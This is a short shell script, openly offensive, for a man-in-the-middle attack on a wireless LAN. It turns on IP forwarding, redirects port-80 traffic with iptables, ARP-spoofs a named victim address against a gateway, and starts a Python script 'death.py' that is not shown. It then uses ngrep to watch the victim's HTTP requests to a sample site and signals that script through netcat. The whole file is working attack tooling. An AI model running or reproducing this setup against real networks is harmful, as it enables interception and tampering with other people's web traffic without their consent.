#!/bin/sh

#prepare arpspoofing
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1024

#start arpsoofing
nohup arpspoof -i wlan0 -t 172.29.225.241 172.29.225.9 &

#Now start python server
nohup /usr/bin/python /root/Moriarity/death.py &

sleep 5 #some time for death.py to bind it's arse

#Start ngrep
#boris.in is the sample target website
#When 172.29.225.9 (victim) recvs a HTTP GET reply for it's request for boris.in
#ngrep signals death.py via netcat
ngrep -d wlan0 -t '^(GET|POST)' 'host boris.in and dst host 172.29.225.9' | nc 127.0.0.1 1331

